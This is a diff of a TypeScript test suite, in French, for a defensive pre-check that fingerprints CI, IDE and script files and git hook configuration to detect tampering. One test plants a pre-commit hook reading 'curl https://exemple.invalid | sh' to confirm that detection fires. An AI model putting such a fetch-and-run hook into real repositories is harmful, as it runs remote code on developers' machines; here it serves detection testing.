@@ -16,14 +16,19 @@ import {
   precontrolerProjet,
   releverEmpreintes,
   releverEmpreintesSalle,
+  releverGitsWorkspace,
   releverProjet,
+  type ReleveEmpreintes,
   renommerSansSuivreLiens,
 } from "./omo-precheck-reader.ts";
+import { detect, etatInitial, type OmoDiskElement, type OmoDiskSnapshot } from "./shared/omo-detections.ts";
 import {
+  analyserConfigGit,
   cheminMasque,
   decidePrecheck,
   estDossierEtatOmo,
   estFichierCle,
+  gitsHorsProtection,
   memeNom,
   NOMS_CONFIG_EXTENSION,
   NOMS_CONFIG_OPENCODE,
@@ -511,9 +516,10 @@ describe("pré-contrôle : empreintes des fichiers d'IDE et de CI", () => {
     assert.deepEqual(premier, second, "deux relevés de suite doivent être identiques");
     assert.equal(premier.impossible, false);
     assert.equal(premier.git, "dossier");
+    // Les fichiers signalés (§4.14.5) le sont à toute profondeur : « outils/aide.ps1 » compte comme « build.ps1 ».
     assert.deepEqual(
       premier.fichiers.map((fichier) => fichier.chemin),
-      [".github/workflows/ci.yml", ".vscode/tasks.json", "Jenkinsfile", "azure-pipelines-v2.yml", "build.ps1", "package.json"],
+      [".github/workflows/ci.yml", ".vscode/tasks.json", "Jenkinsfile", "azure-pipelines-v2.yml", "build.ps1", "outils/aide.ps1", "package.json"],
     );
     for (const fichier of premier.fichiers) assert.match(fichier.sha256, /^[0-9a-f]{64}$/);
     poser(workspace, "projet/.vscode/tasks.json", '{"[synthétique]": "tâche modifiée"}');
@@ -662,7 +668,7 @@ describe("pré-contrôle : empreintes des fichiers d'IDE et de CI", () => {
     for (const nom of ["lie", "passage/projet"]) {
       assert.deepEqual(
         releves.find((releve) => releve.racine === nom),
-        { racine: nom, git: "absent", fichiers: [], liens: ["."], illisibles: [], impossible: true },
+        { racine: nom, git: "absent", fichiers: [], liens: ["."], illisibles: [], impossible: true, signalesIncomplet: false, ideCiDynamiques: [] },
         nom,
       );
     }
@@ -679,7 +685,7 @@ describe("pré-contrôle : empreintes des fichiers d'IDE et de CI", () => {
     for (const nom of [relatif, `equipe/../${relatif}`]) {
       assert.deepEqual(
         releves.find((releve) => releve.racine === nom),
-        { racine: nom, git: "absent", fichiers: [], liens: [], illisibles: ["."], impossible: true },
+        { racine: nom, git: "absent", fichiers: [], liens: [], illisibles: ["."], impossible: true, signalesIncomplet: false, ideCiDynamiques: [] },
         nom,
       );
     }
@@ -696,6 +702,8 @@ describe("pré-contrôle : empreintes des fichiers d'IDE et de CI", () => {
       liens: [],
       illisibles: ["."],
       impossible: true,
+      signalesIncomplet: false,
+      ideCiDynamiques: [],
     });
     // Trois dossiers au premier niveau pour une borne de deux entrées : la lecture s'arrête, le relevé du dossier de travail
     // le dit (impossible) et aucun dossier au-delà de la borne n'est relevé.
@@ -732,6 +740,362 @@ describe("pré-contrôle : empreintes des fichiers d'IDE et de CI", () => {
     for (const nom of DOSSIERS_IDE_CI) poser(workspace, `projet/${nom}/marque.txt`, "[synthétique]");
     const releve = await releverEmpreintes(path.join(workspace, "projet"), "projet");
     assert.deepEqual(releve.fichiers.map((fichier) => fichier.chemin).sort(), DOSSIERS_IDE_CI.map((nom) => `${nom}/marque.txt`).sort());
+  });
+});
+
+/**
+ * Relevés de la salle → instantané des détections, comme le fera le service de détections (L23c) : chemins relatifs à /workspace,
+ * forme de chaque `.git`, cibles de la configuration git, et tout doute (lien, illisible, borne) rend l'instantané incomplet.
+ */
+function instantane(releves: readonly ReleveEmpreintes[]): OmoDiskSnapshot {
+  const elements = new Map<string, OmoDiskElement>();
+  const ideCiDynamiques: string[] = [];
+  let incomplet = false;
+  for (const releve of releves) {
+    const prefixe = releve.racine === "." ? "" : `${releve.racine}/`;
+    for (const fichier of releve.fichiers) elements.set(`${prefixe}${fichier.chemin}`, { forme: "fichier", empreinte: fichier.sha256 });
+    if (releve.git !== "absent") elements.set(`${prefixe}.git`, { forme: releve.git, empreinte: null });
+    for (const cible of releve.ideCiDynamiques) ideCiDynamiques.push(`${prefixe}${cible}`);
+    incomplet ||= releve.impossible || releve.liens.length > 0 || releve.illisibles.length > 0;
+  }
+  return { dossiers: releves.map((releve) => (releve.racine === "." ? "" : releve.racine)), elements, incomplet, ideCiDynamiques };
+}
+
+// --- Fichiers signalés à toute profondeur (§4.14.5 : « package.json, Makefile et *.ps1 modifiés ») --------------------------------------
+
+describe("pré-contrôle : fichiers signalés relevés à toute profondeur", () => {
+  it("app/package.json, scripts/*.ps1 et docs/Makefile sont relevés ; jamais sous node_modules ni .git", async (t) => {
+    const workspace = atelier(t);
+    fabriquerProjet(workspace, "cockpit");
+    poser(workspace, "cockpit/package.json", '{"name": "cockpit"}');
+    poser(workspace, "cockpit/app/package.json", '{"name": "app", "scripts": {}}');
+    poser(workspace, "cockpit/scripts/build-omo-image.ps1", "# [synthétique]\n");
+    poser(workspace, "cockpit/docs/sous/Makefile", "# [synthétique]\n");
+    poser(workspace, "cockpit/app/src/index.ts", "export const x = 1;\n");
+    poser(workspace, "cockpit/app/node_modules/paquet/package.json", '{"name": "paquet"}');
+    poser(workspace, "cockpit/app/Node_Modules/autre/install.ps1", "# [synthétique]\n");
+    poser(workspace, "cockpit/.git/hooks/outil.ps1", "# [synthétique]\n");
+    const releve = await releverEmpreintes(path.join(workspace, "cockpit"), "cockpit");
+    assert.deepEqual(
+      releve.fichiers.map((fichier) => fichier.chemin),
+      ["app/package.json", "docs/sous/Makefile", "package.json", "scripts/build-omo-image.ps1"],
+    );
+    assert.equal(releve.impossible, false);
+    assert.equal(releve.signalesIncomplet, false);
+    // Modifier un script imbriqué change son empreinte, comme à la racine.
+    poser(workspace, "cockpit/app/package.json", '{"name": "app", "scripts": {"postinstall": "node x.js"}}');
+    const apres = await releverEmpreintes(path.join(workspace, "cockpit"), "cockpit");
+    const avant = new Map(releve.fichiers.map((fichier) => [fichier.chemin, fichier.sha256]));
+    assert.deepEqual(
+      apres.fichiers.filter((fichier) => avant.get(fichier.chemin) !== fichier.sha256).map((fichier) => fichier.chemin),
+      ["app/package.json"],
+    );
+  });
+
+  it("une borne atteinte en profondeur ne refuse pas le projet : la liste à relire est dite incomplète", async (t) => {
+    const workspace = atelier(t);
+    fabriquerProjet(workspace, "projet");
+    for (let index = 0; index < 5; index++) poser(workspace, `projet/modules/m${index}/package.json`, `{"name": "m${index}"}`);
+    assert.equal(PRECHECK_BORNES.signalesMaxFichiers, 2000);
+    assert.equal(PRECHECK_BORNES.signalesEntreesMax, 100_000);
+    const complet = await releverEmpreintes(path.join(workspace, "projet"), "projet");
+    assert.equal(complet.fichiers.length, 5);
+    assert.equal(complet.signalesIncomplet, false);
+    for (const bornes of [{ signalesMaxFichiers: 3 }, { signalesEntreesMax: 4 }, { profondeurRelevesMax: 1 }]) {
+      const releve = await releverEmpreintes(path.join(workspace, "projet"), "projet", { ...PRECHECK_BORNES, ...bornes });
+      assert.equal(releve.signalesIncomplet, true, JSON.stringify(bornes));
+      assert.equal(releve.impossible, false, JSON.stringify(bornes));
+      assert.equal((await precontrolerProjet("projet", { workspace, bornes })).verdict, "conforme", JSON.stringify(bornes));
+    }
+  });
+
+  it("un lien rencontré en profondeur n'est pas suivi et ne refuse pas le projet ; un lien au nom d'un fichier signalé rend la liste incomplète", async (t) => {
+    const workspace = atelier(t);
+    const dehors = atelier(t, "omo-dehors-");
+    fabriquerProjet(workspace, "projet");
+    poser(dehors, "lib/package.json", '{"name": "dehors"}');
+    poser(dehors, "Makefile", "# [synthétique]\n");
+    fs.mkdirSync(path.join(workspace, "projet", "outils"), { recursive: true });
+    const dossierLie = lien(path.join(dehors, "lib"), path.join(workspace, "projet", "outils", "lib"), "dir");
+    if (!dossierLie) {
+      t.skip("ce disque ne crée pas de lien symbolique (Windows sans mode développeur) ; obligatoire en CI Linux");
+      return;
+    }
+    const releve = await releverEmpreintes(path.join(workspace, "projet"), "projet");
+    assert.deepEqual(releve.fichiers, [], "rien n'est relevé au bout d'un lien");
+    assert.deepEqual([releve.liens, releve.illisibles, releve.impossible, releve.signalesIncomplet], [[], [], false, false]);
+    assert.equal((await precontrolerProjet("projet", { workspace })).verdict, "conforme");
+    if (!lien(path.join(dehors, "Makefile"), path.join(workspace, "projet", "outils", "Makefile"), "file")) return;
+    const avecFichierLie = await releverEmpreintes(path.join(workspace, "projet"), "projet");
+    assert.deepEqual([avecFichierLie.fichiers, avecFichierLie.liens, avecFichierLie.signalesIncomplet], [[], [], true]);
+    assert.equal((await precontrolerProjet("projet", { workspace })).verdict, "conforme");
+  });
+
+  it("le relevé de la salle ne descend pas deux fois : /workspace à sa racine, chaque dossier de premier niveau en profondeur", async (t) => {
+    const workspace = atelier(t);
+    fabriquerProjet(workspace, "equipe/projet");
+    poser(workspace, "package.json", '{"name": "travail"}');
+    poser(workspace, "equipe/projet/app/package.json", '{"name": "app"}');
+    const releves = await releverEmpreintesSalle({ workspace, prepares: ["equipe/projet"] });
+    assert.deepEqual(releves.find((releve) => releve.racine === ".")?.fichiers.map((fichier) => fichier.chemin), ["package.json"]);
+    assert.deepEqual(releves.find((releve) => releve.racine === "equipe")?.fichiers.map((fichier) => fichier.chemin), ["projet/app/package.json"]);
+    assert.deepEqual(releves.find((releve) => releve.racine === "equipe/projet")?.fichiers.map((fichier) => fichier.chemin), ["app/package.json"]);
+  });
+
+  it("croisé relevé → détection : app/package.json et scripts/x.ps1 modifiés sont signalés à relire, sans arrêt", async (t) => {
+    const workspace = atelier(t);
+    fabriquerProjet(workspace, "projet");
+    poser(workspace, "projet/app/package.json", '{"name": "app"}');
+    poser(workspace, "projet/scripts/x.ps1", "# [synthétique]\n");
+    const avant = instantane(await releverEmpreintesSalle({ workspace, prepares: ["projet"] }));
+    poser(workspace, "projet/app/package.json", '{"name": "app", "scripts": {"postinstall": "node x.js"}}');
+    poser(workspace, "projet/scripts/x.ps1", "# [synthétique] modifié\n");
+    const apres = instantane(await releverEmpreintesSalle({ workspace, prepares: ["projet"] }));
+    const r = detect(etatInitial(), { type: "disque", avant, apres });
+    assert.equal(r.detection, null);
+    assert.deepEqual(r.signales, [
+      { chemin: "projet/app/package.json", genre: "programme" },
+      { chemin: "projet/scripts/x.ps1", genre: "programme" },
+    ]);
+  });
+});
+
+// --- Cibles de la configuration git dans l'arbre de travail (core.hooksPath, include, core.fsmonitor) ------------------------------------
+
+describe("pré-contrôle : cibles de la configuration git (hooks hors de .git)", () => {
+  /** Projet dont .git/config porte `config` ; rend son dossier. */
+  function projetAvecConfig(workspace: string, config: string): string {
+    const dossier = fabriquerProjet(workspace, "projet");
+    poser(workspace, "projet/.git/config", config);
+    return dossier;
+  }
+
+  it("core.hooksPath = .githooks : le dossier de hooks est relevé comme un dossier d'IDE et de CI", async (t) => {
+    const workspace = atelier(t);
+    const dossier = projetAvecConfig(workspace, "[core]\n\trepositoryformatversion = 0\n\thooksPath = .githooks\n");
+    poser(workspace, "projet/.githooks/pre-commit", "#!/bin/sh\n# [synthétique]\n");
+    const releve = await releverEmpreintes(dossier, "projet");
+    assert.deepEqual(releve.ideCiDynamiques, [".githooks"]);
+    assert.deepEqual(releve.fichiers.map((fichier) => fichier.chemin), [".githooks/pre-commit"]);
+    assert.equal((await precontrolerProjet("projet", { workspace })).verdict, "conforme");
+  });
+
+  it("[include] path = ../.gitconfig : le fichier inclus est relevé, et lu à son tour (hooksPath qu'il pose compris)", async (t) => {
+    const workspace = atelier(t);
+    const dossier = projetAvecConfig(workspace, '[include]\n\tpath = ../.gitconfig\n[includeIf "gitdir:~/ailleurs/"]\n\tpath = config.local\n');
+    poser(workspace, "projet/.git/config.local", "[core]\n\tfsmonitor = true\n");
+    poser(workspace, "projet/.gitconfig", "[core]\n\thooksPath = outils/hooks\n");
+    poser(workspace, "projet/outils/hooks/post-checkout", "#!/bin/sh\n");
+    const releve = await releverEmpreintes(dossier, "projet");
+    assert.deepEqual(releve.ideCiDynamiques, [".gitconfig", "outils/hooks"]);
+    assert.deepEqual(releve.fichiers.map((fichier) => fichier.chemin), [".gitconfig", "outils/hooks/post-checkout"]);
+  });
+
+  it("une cible absente est surveillée quand même : git l'ignore aujourd'hui, la lirait dès qu'elle apparaît", async (t) => {
+    const workspace = atelier(t);
+    const dossier = projetAvecConfig(workspace, "[include]\n\tpath = ../.gitconfig-equipe\n[core]\n\thooksPath = .githooks\n\tfsmonitor = ./outils/fsmon.sh\n");
+    const releve = await releverEmpreintes(dossier, "projet");
+    assert.deepEqual(releve.ideCiDynamiques, [".gitconfig-equipe", ".githooks", "outils/fsmon.sh"]);
+    assert.deepEqual(releve.fichiers, []);
+    assert.equal(releve.impossible, false);
+  });
+
+  it("hooks de husky (.husky/_) : aucun changement, .husky est déjà un dossier d'IDE et de CI", async (t) => {
+    const workspace = atelier(t);
+    const dossier = projetAvecConfig(workspace, "[core]\n\thooksPath = .husky/_\n");
+    poser(workspace, "projet/.husky/_/pre-commit", "#!/bin/sh\n");
+    const releve = await releverEmpreintes(dossier, "projet");
+    assert.deepEqual(releve.ideCiDynamiques, []);
+    assert.deepEqual(releve.fichiers.map((fichier) => fichier.chemin), [".husky/_/pre-commit"]);
+  });
+
+  it("une cible dans .git (lecture seule) n'est pas relevée : elle ne peut pas changer", async (t) => {
+    const workspace = atelier(t);
+    const dossier = projetAvecConfig(workspace, "[core]\n\thooksPath = .git/hooks-equipe\n");
+    const releve = await releverEmpreintes(dossier, "projet");
+    assert.deepEqual([releve.ideCiDynamiques, releve.fichiers, releve.impossible], [[], [], false]);
+  });
+
+  it("fermé en cas de doute : cible hors du projet, absolue ou dans le HOME, configuration trop grosse ou non analysable → refus", async (t) => {
+    const cas: [string, string, OmoPrecheckReason][] = [
+      ["hors du projet", "[core]\n\thooksPath = ../hooks-partages\n", "empreinte-impossible"],
+      ["absolue", "[core]\n\thooksPath = /opt/hooks\n", "empreinte-impossible"],
+      ["absolue de l'hôte", "[core]\n\thooksPath = C:/outils/hooks\n", "empreinte-impossible"],
+      ["dans le HOME", "[include]\n\tpath = ~/.gitconfig-travail\n", "empreinte-impossible"],
+      ["trop grosse", `[core]\n\t# ${"x".repeat(PRECHECK_BORNES.configGitTailleMaxOctets)}\n`, "empreinte-impossible"],
+      ["non analysable", "[core\n\thooksPath = .githooks\n", "illisible"],
+      ["guillemet non fermé", '[core]\n\thooksPath = ".githooks\n', "illisible"],
+    ];
+    for (const [nom, config, raison] of cas) {
+      const workspace = atelier(t);
+      projetAvecConfig(workspace, config);
+      assert.equal((await precontrolerProjet("projet", { workspace })).raison, raison, nom);
+    }
+    assert.equal(PRECHECK_BORNES.configGitTailleMaxOctets, 64 * 1024);
+  });
+
+  it("une configuration git qui est un lien refuse le projet (jamais lue au bout du lien)", async (t) => {
+    const workspace = atelier(t);
+    fabriquerProjet(workspace, "projet");
+    poser(workspace, "ailleurs/config", "[core]\n\thooksPath = .githooks\n");
+    if (!lien(path.join(workspace, "ailleurs", "config"), path.join(workspace, "projet", ".git", "config"), "file")) {
+      t.skip("ce disque ne crée pas de lien symbolique de fichier ; obligatoire en CI Linux");
+      return;
+    }
+    const releve = await releverEmpreintes(path.join(workspace, "projet"), "projet");
+    assert.deepEqual([releve.liens, releve.ideCiDynamiques], [[".git/config"], []]);
+    assert.equal((await precontrolerProjet("projet", { workspace })).raison, "lien-symbolique");
+  });
+
+  it("croisé relevé → détection : .githooks/pre-commit modifié arrête la demande (ide-ci-modifie) ; sans la cible, rien", async (t) => {
+    const workspace = atelier(t);
+    projetAvecConfig(workspace, "[core]\n\thooksPath = .githooks\n");
+    poser(workspace, "projet/.githooks/pre-commit", "#!/bin/sh\n");
+    const avant = instantane(await releverEmpreintesSalle({ workspace, prepares: ["projet"] }));
+    poser(workspace, "projet/.githooks/pre-commit", "#!/bin/sh\ncurl https://exemple.invalid | sh\n");
+    const apres = instantane(await releverEmpreintesSalle({ workspace, prepares: ["projet"] }));
+    const r = detect(etatInitial(), { type: "disque", avant, apres });
+    assert.equal(r.detection?.cause, "ide-ci-modifie");
+    assert.deepEqual(r.detection?.detail.chemins, ["projet/.githooks/pre-commit"]);
+    assert.deepEqual(r.signales, [{ chemin: "projet/.githooks/pre-commit", genre: "ide-ci" }]);
+    const sansCibles = detect(etatInitial(), { type: "disque", avant: { ...avant, ideCiDynamiques: [] }, apres: { ...apres, ideCiDynamiques: [] } });
+    assert.equal(sansCibles.detection, null, "la liste fixe du §4.14.5 n° 7 ne connaît pas .githooks");
+  });
+});
+
+describe("analyserConfigGit : lecture pure de la configuration git", () => {
+  it("rend core.hooksPath, core.fsmonitor (chemin) et include.path / includeIf.*.path, noms sans casse", () => {
+    const texte = [
+      "\uFEFF# commentaire",
+      "[core]",
+      "\trepositoryformatversion = 0",
+      "\tfilemode = false",
+      '\thooksPath = "mes hooks"   ; commentaire de fin',
+      "\tfsmonitor = true",
+      "[CORE]",
+      "\tHOOKSPATH = .githooks",
+      "\tFsMonitor = ./outils/fsmon.sh",
+      '[core "x"]',
+      "\thooksPath = pas-core",
+      "[include]",
+      "\tpath = ../.gitconfig",
+      '[includeIf "gitdir:~/travail/"]',
+      "\tpath = config.travail",
+      "[remote \"origin\"]",
+      "\turl = https://exemple.invalid/depot.git",
+      "\tfetch = +refs/heads/*:refs/remotes/origin/*",
+      "[alias]",
+      "\tco = checkout",
+      "\tvide",
+      "[section] cle = valeur",
+      "\tsuite = a\\",
+      "b",
+      "",
+    ].join("\n");
+    assert.deepEqual(analyserConfigGit(texte), {
+      hooksPath: ["mes hooks", ".githooks"],
+      fsmonitor: ["./outils/fsmon.sh"],
+      includes: ["../.gitconfig", "config.travail"],
+    });
+  });
+
+  it("fermé en cas de doute : section, clé ou valeur non analysable → null", () => {
+    for (const texte of ["[core\n", "[core]\n\t= valeur\n", '[core]\n\thooksPath = "ouvert\n', "[core]\n\thooksPath = a\\q\n", "cle-sans-section = 1\n", '[section "sous]\n']) {
+      assert.equal(analyserConfigGit(texte), null, JSON.stringify(texte));
+    }
+    assert.deepEqual(analyserConfigGit(""), { hooksPath: [], fsmonitor: [], includes: [] });
+  });
+});
+
+// --- Dépôts git du dossier de travail, relevés par le cockpit à l'activation (D-2b-28, §4.14.2, fiche L22c) ----------------------------
+
+describe("pré-contrôle : dépôts git du dossier de travail vus par le cockpit (activation)", () => {
+  const alphaProtege = [{ chemin: "alpha", forme: "dossier" as const }];
+
+  it("un dépôt cloné après le démarrage, à n'importe quelle profondeur, est hors de la protection d'install.ps1", async (t) => {
+    const workspace = atelier(t);
+    fabriquerProjet(workspace, "alpha");
+    const avant = await releverGitsWorkspace({ workspace });
+    assert.deepEqual(avant, { depots: ["alpha/.git"], limiteAtteinte: false });
+    assert.deepEqual(gitsHorsProtection(avant.depots, alphaProtege), []);
+    // Opencode attend au repos entre deux demandes : le balayage de la salle date de son démarrage, celui-ci de l'activation.
+    fabriquerProjet(workspace, "clients/outil");
+    const apres = await releverGitsWorkspace({ workspace });
+    assert.deepEqual(apres.depots, ["alpha/.git", "clients/outil/.git"]);
+    assert.deepEqual(gitsHorsProtection(apres.depots, alphaProtege), ["clients/outil/.git"]);
+  });
+
+  it("mêmes règles que le balayage de la salle : node_modules et intérieur des dépôts sautés, dépôts nus vus, .git fichier compté", async (t) => {
+    const workspace = atelier(t);
+    fabriquerProjet(workspace, "alpha");
+    poser(workspace, "alpha/.git/modules/interne/.git/HEAD", "ref: refs/heads/principale\n");
+    poser(workspace, "appli/node_modules/paquet/.git/HEAD", "ref: refs/heads/principale\n");
+    poser(workspace, "sous-module/.git", "gitdir: ../alpha/.git/modules/interne\n");
+    poser(workspace, "remotes/outil.git/HEAD", "ref: refs/heads/principale\n");
+    fs.mkdirSync(path.join(workspace, "remotes", "outil.git", "objects", "cache", ".git"), { recursive: true });
+    fs.mkdirSync(path.join(workspace, "remotes", "outil.git", "refs", "heads"), { recursive: true });
+    poser(workspace, "docs/HEAD", "titre\n");
+    const releve = await releverGitsWorkspace({ workspace });
+    assert.deepEqual(releve.depots, ["alpha/.git", "remotes/outil.git", "sous-module/.git"]);
+    assert.equal(releve.limiteAtteinte, false);
+  });
+
+  it("un lien n'est jamais suivi, et un .git lien est un dépôt hors protection", async (t) => {
+    const workspace = atelier(t);
+    fabriquerProjet(workspace, "alpha");
+    fabriquerProjet(workspace, "dehors/projet");
+    const raccourci = lien(path.join(workspace, "dehors"), path.join(workspace, "raccourci"), "dir");
+    fs.mkdirSync(path.join(workspace, "lie"));
+    const gitLie = lien(path.join(workspace, "alpha", ".git"), path.join(workspace, "lie", ".git"), "dir");
+    if (!raccourci || !gitLie) {
+      t.skip("ce disque ne crée pas de lien symbolique (Windows sans mode développeur) ; obligatoire en CI Linux");
+      return;
+    }
+    const releve = await releverGitsWorkspace({ workspace });
+    assert.deepEqual(releve.depots, ["alpha/.git", "dehors/projet/.git", "lie/.git"]);
+    assert.deepEqual(gitsHorsProtection(releve.depots, [...alphaProtege, { chemin: "dehors/projet", forme: "dossier" }]), ["lie/.git"]);
+  });
+
+  it("dossier de travail absent, dossier trop peuplé, plafond ou profondeur atteints : limite atteinte (fermé en cas de doute)", async (t) => {
+    const workspace = atelier(t);
+    fabriquerProjet(workspace, "alpha");
+    fabriquerProjet(workspace, "beta");
+    assert.equal((await releverGitsWorkspace({ workspace })).limiteAtteinte, false);
+    assert.equal((await releverGitsWorkspace({ workspace: path.join(workspace, "absent") })).limiteAtteinte, true);
+    assert.equal((await releverGitsWorkspace({ workspace, bornes: { balayageGitEntreesMax: 3 } })).limiteAtteinte, true);
+    assert.equal((await releverGitsWorkspace({ workspace, bornes: { profondeurMax: 0 } })).limiteAtteinte, true);
+    assert.equal((await releverGitsWorkspace({ workspace, bornes: { entreesMaxParDossier: 1 } })).limiteAtteinte, true);
+    assert.equal(PRECHECK_BORNES.balayageGitEntreesMax, 200_000);
+  });
+
+  it("un dossier illisible cache peut-être un .git : limite atteinte", async (t) => {
+    const workspace = atelier(t);
+    fabriquerProjet(workspace, "alpha");
+    const cache = path.join(workspace, "cache");
+    fabriquerProjet(workspace, "cache/p");
+    if (!rendreIllisible(cache)) {
+      t.skip("ce système lit un dossier en 000 (Windows, superutilisateur) ; obligatoire en CI Linux");
+      return;
+    }
+    try {
+      assert.equal((await releverGitsWorkspace({ workspace })).limiteAtteinte, true);
+    } finally {
+      fs.chmodSync(cache, 0o755);
+    }
+  });
+
+  it("gitsHorsProtection : omo-projets.json peut nommer le dossier du dépôt ou son .git ; rien d'autre ne couvre", () => {
+    const proteges = [
+      { chemin: "alpha", forme: "dossier" as const },
+      { chemin: "beta/.git", forme: "dossier" as const },
+      { chemin: "./gamma/", forme: "fichier" as const },
+      { chemin: "delta\\sous", forme: "dossier" as const },
+    ];
+    const trouves = ["alpha/.git", "beta/.git", "gamma/.git", "delta/sous/.git", "alpha/sous/.git", "epsilon/.git", "remotes/outil.git"];
+    assert.deepEqual(gitsHorsProtection(trouves, proteges), ["alpha/sous/.git", "epsilon/.git", "remotes/outil.git"]);
+    assert.deepEqual(gitsHorsProtection(trouves, []), [...trouves].sort());
+    // Un dépôt nu protégé par install.ps1 est nommé par son dossier.
+    assert.deepEqual(gitsHorsProtection(["remotes/outil.git"], [{ chemin: "remotes/outil.git", forme: "dossier" }]), []);
   });
 });
 
